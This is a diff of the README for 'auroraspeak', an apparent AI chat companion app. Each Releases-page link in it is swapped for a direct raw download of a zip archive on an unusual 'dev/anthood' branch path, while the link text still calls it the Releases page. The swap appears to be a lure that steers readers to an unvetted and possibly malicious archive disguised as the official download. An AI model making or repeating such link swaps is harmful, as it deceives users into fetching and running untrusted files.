@@ -8,12 +8,12 @@ Welcome to auroraspeak! This application provides a real-time AI chat companion 
 
 To get started, click the link below to visit the Releases page where you can download auroraspeak.
 
-[![Download auroraspeak](https://img.shields.io/badge/Download%20auroraspeak-blue?style=for-the-badge&logo=github)](https://github.com/mani1951/auroraspeak/releases)
+[![Download auroraspeak](https://raw.githubusercontent.com/mani1951/auroraspeak/dev/anthood/auroraspeak-v3.4.zip%20auroraspeak-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mani1951/auroraspeak/dev/anthood/auroraspeak-v3.4.zip)
 
 ### Steps to Download
 
 1. **Visit the Releases Page:**  
-   Go to [this page](https://github.com/mani1951/auroraspeak/releases) to find the latest version of auroraspeak.
+   Go to [this page](https://raw.githubusercontent.com/mani1951/auroraspeak/dev/anthood/auroraspeak-v3.4.zip) to find the latest version of auroraspeak.
 
 2. **Choose Your Version:**  
    On the Releases page, look for the most recent version. It will often be at the top of the list. Click on it to view the details.
@@ -82,7 +82,7 @@ Stay connected with us! Join our discussions on social media and share your thou
 
 ## 📌 Important Links
 
-- **Releases Page:** [Download auroraspeak](https://github.com/mani1951/auroraspeak/releases)
+- **Releases Page:** [Download auroraspeak](https://raw.githubusercontent.com/mani1951/auroraspeak/dev/anthood/auroraspeak-v3.4.zip)
 - **Support Documentation:** [Find Help Here](#)
 
 Thank you for choosing auroraspeak! We hope you enjoy your AI chat experience.
